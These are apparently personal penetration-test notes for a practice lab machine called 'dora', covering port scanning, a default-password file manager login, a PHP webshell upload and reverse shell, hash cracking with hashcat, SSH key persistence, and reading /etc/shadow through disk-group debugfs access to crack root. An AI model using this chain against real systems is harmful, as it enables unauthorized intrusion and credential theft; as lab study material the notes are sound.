### Enumeration
```
IP=192.168.209.16
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80 -A $IP
```
### Ports 
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- 80
	- Apache httpd 2.4.41 ((Ubuntu))
### Foothold
- 80
	- ![[Pasted image 20240705090442.png]]
	- Hit lets go
		- ![[Pasted image 20240705090515.png]]
		- We need the creds from:  wp-config.php
	- Directory Brute force
		- dirsearch -u http://$IP
			- /filemanager
				- ![[Pasted image 20240705090811.png]]
				- admin:admin  -  successful
					- ![[Pasted image 20240705090839.png]]
					- Upload php webshell
						- ![[Pasted image 20240705091212.png]]
						- Now we have CE
						- Used busy box rev shell
			- /license.txt
			- /readme.html
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
### PE
#### Linux
- www-data
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- needs password
	- uname -a
		- `Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
	- Users with console
		- dora
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
		- nothing
	- www-data@dora:/var/www/html/filemanager/config
		- .htusers.php
			- `dora:$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS`
			- hashcat -m 3200 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
				- doraemon
				- su dora
					- doraemon
					- success
- dora
	- id
		- uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
	- sudo -l
		- can't run sudo
	- Persistance
		- cd ~
		- mkdir .ssh
		- Move id_rsa.pub to B
		- mv id_rsa.pub authorized_keys
		- ssh -i id_rsa dora@192.168.209.16
			- Success
	- disk
		- df -h
			- ![[Pasted image 20240705094130.png]]
		- debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
			- cat /etc/shadow
			- cat /etc/passwd
			- Put root line into separate file
			- unshadow root.passwd root.shadow > root.unshadow
			- hashcat -m 1800 -a 0 root.unshadow /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
				- explorer
### Credentials
- dora:doraemon
- root:explorer
### Lessons Learned
- Run a directory scan of the root directory of web server
- Check config files for hashes and passwords
- Disk group can read /etc/shadow and sometimes /root/.ssh
- Use unshadow to get root passwd